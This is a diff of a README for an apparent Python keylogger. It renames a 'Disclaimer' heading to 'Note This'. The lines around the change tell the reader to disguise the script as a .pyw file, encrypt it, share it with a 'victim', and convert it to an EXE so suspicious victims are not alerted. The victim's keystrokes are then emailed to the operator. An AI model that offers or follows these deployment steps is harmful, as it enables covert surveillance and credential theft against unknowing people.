@@ -14,7 +14,7 @@ _Don't use this to take revenge_<br />
 * `Then Rename The File Like This (filename.pyw) Then Share To Victim By Encrypting The Python Code`
 * `When the Victim Run the Code(Make Sure That The Victim Must Have Been Connected to Internet), The Every Key Strokes Of the Victim Will Emailing To You (The Email which You Type On Line Number 31)`
 
-## Disclaimer
+## Note This
 Some Victims Have Already Know About The Python File So They Check The File</br>
 So You Just Convert The Python File To An EXE File Then Share It
 
